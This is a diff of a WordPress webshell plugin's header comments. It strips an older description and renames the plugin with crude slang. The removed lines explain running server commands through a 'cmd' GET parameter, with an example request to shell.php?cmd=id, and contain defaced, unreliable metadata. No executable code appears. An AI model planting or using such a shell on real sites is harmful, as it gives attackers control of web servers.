@@ -1,22 +1,12 @@
 <?php
-//Jembut Mawot Litespeed//
-    /*
-    Plugin Name: Plugins & Tempik Wordpress Shell
-    Plugin URI: fbi.gov
-    Description: Commands Jembot shoppe pay as the webserver you are serving wordpress with! Shell will probably live at /wp-content/plugins/shell/shell.php. Commands can be given using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/shell/shell.php?cmd=id", should provide you with output such as <code>uid=33(www-data) gid=verd33(www-data) groups=33(www-data)</code>
-    Author: Bacot Lu Lamer
-    Version: 0.3
-    Author URI: https://gantengerscrew.github.io
-    */
-//attempt to protect myjemnud//
 /*
-Plugin Name: Webshell
+Plugin Name: JEMBOT MAWOT LITESPEED
 Plugin URI: https://github.com/p0dalirius/Wordpress-webshell-plugin
 Description: A webshell API for WordPress.
 Author: Remi Gascou (Podalirius)
 Version: 1.1.0
-Author URI: https://podalirius.net/
-Text Domain: webshell
+Author URI: BULU JAMBOED
+Text Domain: webshell JAMBOED
 Domain Path: /languages
 License: GPLv3 or later
 Network: true
